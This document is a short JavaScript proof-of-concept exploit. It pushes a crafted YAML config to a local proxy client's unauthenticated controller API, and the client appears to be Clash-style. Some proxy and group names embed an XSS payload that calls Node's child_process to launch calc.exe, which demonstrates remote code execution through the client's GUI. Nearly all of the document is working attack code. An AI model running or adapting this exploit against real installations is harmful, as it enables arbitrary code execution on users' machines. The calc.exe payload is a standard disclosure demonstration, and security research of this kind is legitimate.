const data = {
        payload: "port: 7890\nsocks-port: 7891\nallow-lan: true\nmode: Rule\nlog-level: info\nexternal-controller: :59826\nproxies:\n  - name: a<img/src=\"1\"/onerror=eval(`require(\"child_process\").exec(\"calc.exe\");`);>\n    type: socks5\n    server: 127.0.0.1\n    port: \"17938\"\n    skip-cert-verify: true\n  - name: abc\n    type: socks5\n    server: 127.0.0.1\n    port: \"8088\"\n    skip-cert-verify: true\n\nproxy-groups:\n  -\n    name: <img/src=\"1\"/onerror=eval(`require(\"child_process\").exec(\"calc.exe\");`);>\n    type: select\n    proxies:\n    - a<img/src=\"1\"/onerror=eval(`require(\"child_process\").exec(\"calc.exe\");`);>"
    };
    fetch('http://127.0.0.1:59826/configs?force=true', {
        method: 'PUT',
        headers: {
            'Content-type': 'application/json; charset=utf-8',
        },
        body: JSON.stringify(data),
    }).then(response => response.json())
        .then(data => {
            console.log('Success:', data);
        })
        .catch((error) => {
            console.log('Error:', error);
        });
